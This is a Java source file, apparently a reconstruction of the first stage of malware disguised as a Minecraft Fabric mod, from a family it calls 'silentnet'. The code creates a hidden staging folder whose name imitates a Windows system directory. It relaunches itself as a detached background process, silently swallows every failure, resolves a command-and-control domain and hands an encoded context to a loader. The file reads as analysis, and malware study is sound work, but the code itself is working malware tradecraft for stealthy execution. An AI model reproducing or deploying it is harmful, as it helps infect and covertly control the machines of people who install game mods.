package silentnet.stage1;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Base64;

/**
 * Reconstructed from net.fabric.zCj.
 *
 * This is the manifest Main-Class. Its only real jobs are:
 *
 *   1. Create %LOCALAPPDATA%\Microsoft\Windows\NtProfileIndex and relaunch
 *      itself from the original JAR path, detached from the Minecraft process.
 *   2. On the relaunched copy, resolve the C2 domain and hand a small JSON
 *      context to the stage-1 loader (net.fabric.hyte).
 *
 * Any other command line is forwarded to the loader unchanged.
 */
public final class Stage1Launcher {
    private static final String RESTART_ARG = "-restarted";
    private static final String WORK_DIR_NAME = "NtProfileIndex";

    private Stage1Launcher() {
    }

    public static void main(String[] args) {
        if (args.length > 0 && !args[0].equals(RESTART_ARG)) {
            Stage1Loader.main(args);
            return;
        }
        for (String arg : args) {
            if (arg.equals(RESTART_ARG)) {
                runDetached();
                return;
            }
        }
        relaunchDetached();
    }

    /**
     * First execution: spawn javaw.exe -cp <jar> net.fabric.zCj -restarted with
     * the working directory set to the staging folder and all output appended
     * to _spawn.log.
     */
    private static void relaunchDetached() {
        try {
            Path javaExe = javaExecutable();
            String jarPath = new File(Stage1Launcher.class.getProtectionDomain()
                    .getCodeSource().getLocation().toURI()).getAbsolutePath();
            Path workDir = defaultWorkDir();
            Files.createDirectories(workDir);

            ProcessBuilder pb = new ProcessBuilder(
                    javaExe.toString(),
                    "-cp", jarPath,
                    Stage1Launcher.class.getName(),
                    RESTART_ARG);
            pb.redirectInput(ProcessBuilder.Redirect.from(new File("NUL")));
            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(
                    workDir.resolve("_spawn.log").toFile()));
            pb.redirectErrorStream(true);
            pb.directory(workDir.toFile());
            pb.start();
        } catch (Exception ignored) {
            // The original silently swallows every failure in this path.
        }
    }

    /**
     * Second execution: build the "DoubleClick" context. This path is used when
     * the JAR is started directly rather than loaded as a Fabric mod.
     */
    private static void runDetached() {
        Stage1Loader loader = new Stage1Loader();
        String domain = loader.getDomain();
        String userId = Stage1Loader.defaultUserId();
        String tag = Stage1Loader.defaultTag();

        String context = "{"
                + "\"userId\":\"" + Json.escape(userId) + "\","
                + "\"tag\":\"" + Json.escape(tag) + "\","
                + "\"domain\":\"" + Json.escape(domain) + "\","
                + "\"env\":\"DoubleClick\""
                + "}";
        String encoded = Base64.getEncoder()
                .encodeToString(context.getBytes(StandardCharsets.UTF_8));
        Stage1Loader.main(new String[]{encoded});
    }

    private static Path javaExecutable() {
        String javaHome = System.getProperty("java.home");
        Path javaw = Path.of(javaHome, "bin", "javaw.exe");
        if (Files.exists(javaw)) {
            return javaw;
        }
        return Path.of(javaHome, "bin", "java.exe");
    }

    static Path defaultWorkDir() {
        String localAppData = System.getenv("LOCALAPPDATA");
        return Path.of(localAppData, "Microsoft", "Windows", WORK_DIR_NAME);
    }
}
